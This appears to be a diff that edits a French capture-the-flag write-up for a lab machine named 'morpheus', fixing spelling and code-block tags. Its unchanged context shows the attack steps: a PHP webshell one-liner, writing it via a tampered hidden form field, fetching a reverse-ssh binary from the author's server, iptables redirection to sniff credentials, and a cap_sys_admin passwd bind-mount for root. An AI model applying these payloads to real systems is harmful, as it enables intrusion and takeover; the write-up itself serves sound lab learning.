@@ -24,7 +24,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.18.0
 ```
 
-A première vue une énumération web avec *Feroxbuster* ne donne rien d'intéressant :
+À première vue une énumération web avec *Feroxbuster* ne donne rien d'intéressant :
 
 ```
 301        9l       28w      323c http://192.168.242.129/javascript
@@ -56,7 +56,7 @@ Sur le script PHP on retrouve le même message avec un formulaire permettant de 
 
 J'aurais parié que le script fait un `include()` du fichier texte. J'ai donc saisi `<?php system($_GET["cmd"]); ?>` mais le code n'était pas interprété et se retrouvait dans le code HTML de la page.
 
-Par contre je me suis apperçu que le formulaire dispose d'un champ caché qui spécifie dans quel fichier écrire les données :
+Par contre, je me suis aperçu que le formulaire dispose d'un champ caché qui spécifie dans quel fichier écrire les données :
 
 ```html
 <form method="post">
@@ -66,18 +66,18 @@ Par contre je me suis apperçu que le formulaire dispose d'un champ caché qui s
 </form>
 ```
 
-Par conséquent on peut utiliser les outils de développement du navigateur pour modifier le nom du fichier et cette fois écrire notre shell dans un nouveau fichier PHP. J'obtiens alors mon webshell avec l'utilisateur `www-data`.
+Par conséquent, on peut utiliser les outils de développement du navigateur pour modifier le nom du fichier et cette fois écrire notre shell dans un nouveau fichier PHP. J'obtiens alors mon webshell avec l'utilisateur `www-data`.
 
 Le serveur autorise la connexion sortante sur le port 80, j'utilise mon webshell pour télécharger un reverse-ssh depuis un serveur web python que j'ai lancé :
 
-```bash
+```console
 $ sudo python3 -m http.server 80
 [sudo] Mot de passe de root : 
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 192.168.242.129 - - [20/Nov/2022 09:16:17] "GET /reverse-sshx64 HTTP/1.1" 200 -
 ```
 
-A la racine du serveur web je trouve une image `.cypher-neo.png` mais elle ne recèle rien d'intéressant (analyse via `exiftool` et `ghex`).
+À la racine du serveur web je trouve une image `.cypher-neo.png` mais elle ne recèle rien d'intéressant (analyse via `exiftool` et `ghex`).
 
 Il y a deux utilisateurs présents sur le système. Aucun ne semble plus privilégié que l'autre :
 
@@ -88,7 +88,7 @@ uid=1001(cypher) gid=1001(cypher) groups=1001(cypher),1002(humans)
 
 La recherche des fichiers de `cypher` retourne un flag :
 
-```bash
+```console
 www-data@morpheus:/var/www$ find / -user cypher 2> /dev/null 
 /home/cypher
 /FLAG.txt
@@ -109,7 +109,7 @@ Voici le contenu :
 
 Le groupe `humans` a deux entrées :
 
-```bash
+```console
 www-data@morpheus:/var/www$ find / -group humans -ls 2> /dev/null 
        35   5352 -rwxr-x---   1 root     humans    5479736 Oct 28  2021 /usr/bin/python3-9
    134453      4 drwxrwxr-x   2 root     humans       4096 Oct 28  2021 /crew
@@ -117,9 +117,9 @@ www-data@morpheus:/var/www$ find / -group humans -ls 2> /dev/null
 
 Ne faisant pas, à ce stade de mes explorations, membre du groupe `humans` je ne peux pas lire le contenu de `/usr/bin/python3-9` mais la taille est exactement la même que `/usr/bin/python3.9` qui est le vrai interpréteur Python.
 
-Le dossier `crew` est quand à lui vide...
+Le dossier `crew` est quant à lui vide...
 
-J'ai cherché les noms de fichiers contenant `smith` ou `cypher` mais ça n'a rien retourné puis en regardant les ports en écoute je me suis rappelé de la présence du port 81 dont l'accès est protégé par une demande d'authentification.
+J'ai cherché les noms de fichiers contenants `smith` ou `cypher` mais ça n'a rien retourné puis en regardant les ports en écoute je me suis rappelé de la présence du port 81 dont l'accès est protégé par une demande d'authentification.
 
 On trouve la configuration du *Nginx* dans `/etc/nginx/sites-enabled/default` :
 
@@ -177,16 +177,16 @@ J'ai passé la wordlist *rockyou* sur le hash de `cypher` mais ç'a n'a rien don
 
 J'ai donc fouillé un peu avec *LinPEAS* et il a déjà remarqué que la copie du binaire Python a une capability :
 
-```bash
+```console
 www-data@morpheus:/tmp$ getcap /usr/bin/python3-9              
 /usr/bin/python3-9 cap_sys_admin=ep
 ```
 
-Je devrais pouvoir passer root avec ce binaire mais pour le moment je ne peux pas l'exécuter, il me faut au moins les permissions `humans`.
+Je devrais pouvoir passer root avec ce binaire, mais pour le moment je ne peux pas l'exécuter, il me faut au moins les permissions `humans`.
 
-A court d'idées, j'ai vu un port en écoute sur l'interface loopback et il s'agit d'un HTTP :
+À court d'idées, j'ai vu un port en écoute sur l'interface loopback et il s'agit d'un HTTP :
 
-```bash
+```console
 www-data@morpheus:/tmp$ nc 127.0.0.1 46449 -v
 Connection to 127.0.0.1 46449 port [tcp/*] succeeded!
 GET / HTTP/1.0
@@ -219,12 +219,12 @@ L'idée était la bonne :
 
 Je trouve trace du `chown` dans un fichier de cron :
 
-```bash
+```console
 www-data@morpheus:/tmp$ cat /etc/cron.d/fix-ownership-on-crew
 * * * * * root chown -R root /crew
 ```
 
-Mais aucune trace de `basic-auth-client`. Il en va de même pour un fichier `/main.sh` vu dans la liste des processus mais absent sur le système. Tout ça est certainement du à l'utilisateur de containeurs Docker.
+Mais aucune trace de `basic-auth-client`. Il en va de même pour un fichier `/main.sh` vu dans la liste des processus, mais absent sur le système. Tout ça est certainement du à l'utilisateur de containeurs Docker.
 
 Ce programme `basic-auth-client` laisse penser qu'il se connecte sur le port 81 et qu'il simule en quelque sorte l'accès de l'`Agent Smith`. Je ne peux pas lire le binaire ni lire le flux réseau... comment faire alors pour obtenir les identifiants qui transitent ?
 
@@ -246,7 +246,7 @@ Files with capabilities (limited to 50):
 
 Les binaires `xtables` sont des sortes de wrapper autour des commandes *iptables*. Celui qui est setuid root semble refuser de fonctionner :
 
-```bash
+```console
 $ /usr/sbin/xtables-legacy-multi iptables -L
 iptables v1.8.7 (legacy): can't initialize iptables table `filter': Permission denied (you must be root)
 Perhaps iptables or your kernel needs to be upgraded.
@@ -254,7 +254,7 @@ Perhaps iptables or your kernel needs to be upgraded.
 
 L'autre qui a juste la capability `cap_net_admin` (voir [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)) fonctionne correctement :
 
-```bash
+```console
 $ /usr/sbin/xtables-nft-multi iptables -L
 Chain INPUT (policy ACCEPT)
 target     prot opt source               destination         
@@ -293,7 +293,7 @@ Mon objectif est donc d'utiliser `iptables` pour forwarder les paquets à destin
 
 J'ai fouillé un peu sur Internet et utilisé les commandes suivantes :
 
-```bash
+```console
 $ /usr/sbin/xtables-nft-multi iptables -A FORWARD -p tcp -d 172.17.0.1 --dport 81 -j ACCEPT
 $ /usr/sbin/xtables-nft-multi iptables -A PREROUTING -t nat -i docker0 -p tcp --dport 81 -j DNAT --to 172.17.0.1:8181
 ```
@@ -302,7 +302,7 @@ Je ne suis pas sûr que la première commande soit nécessaire ici mais la secon
 
 Finalement ça a frappé à la porte :
 
-```bash
+```console
 www-data@morpheus:/var/www/html$ nc -l -p 8181 -v
 nc: getnameinfo: Temporary failure in name resolution
 nc: getnameinfo: Temporary failure in name resolution
@@ -321,14 +321,14 @@ C'est clair que *rockyou* n'aurait pas cassé ça ! Le mot de passe permet de se
 
 Un flag est dans le dossier de l'utilisateur :
 
-```bash
+```console
 cypher@morpheus:~$ cat FLAG.txt 
 You've clearly gained access as user Cypher.
 
 Can you find a way to get to root?
 ```
 
-Je pensais que la capability `cap_sys_admin` sur `/usr/bin/python3-9` me permettrait de faire un setuid 0 et d'obtenir un shell mais d'après la manpage, ce qui ressort c'est surtout la possibilité de pouvoir monter / démonter des systèmes de fichier.
+Je pensais que la capability `cap_sys_admin` sur `/usr/bin/python3-9` me permettrait de faire un setuid 0 et d'obtenir un shell, mais d'après la manpage, ce qui ressort c'est surtout la possibilité de pouvoir monter / démonter des systèmes de fichier.
 
 J'ai trouvé ce post *StackOverflow* : [unix - How do I mount a filesystem using Python?](https://stackoverflow.com/questions/1667257/how-do-i-mount-a-filesystem-using-python/29156997#29156997) Il indique comment monter un FS en Python.
 
@@ -338,9 +338,9 @@ Mon idée était de créer un FS dans un fichier (`dd` pour créer un fichier vi
 
 La fonction de la libc s'attend à recevoir un périphérique et non un fichier...
 
-Du coup je me suis rabbatu sur l'astuce de [Linux Capabilities - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_admin) qui consiste à binder un fichier `passwd` par dessus le vrai `/etc/passwd` pour se connecter avec l'utilisateur `root` et un mot de passe de notre choix :
+Du coup je me suis rabattu sur l'astuce de [Linux Capabilities - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_admin) qui consiste à binder un fichier `passwd` par dessus le vrai `/etc/passwd` pour se connecter avec l'utilisateur `root` et un mot de passe de notre choix :
 
-```bash
+```console
 cypher@morpheus:~$ cp /etc/passwd .
 cypher@morpheus:~$ openssl passwd -1 -salt abc devloop
 $1$abc$I96LD.QLSgd3iCCrM7yNv1
@@ -390,7 +390,7 @@ do
 done
 ```
 
-On ne dispose pas du code source pour le binaire mais on sait ce qu'il fait :)
+On ne dispose pas du code source pour le binaire, mais on sait ce qu'il fait :)
 
 Un CTF très intéressant, merci à son auteur !
 
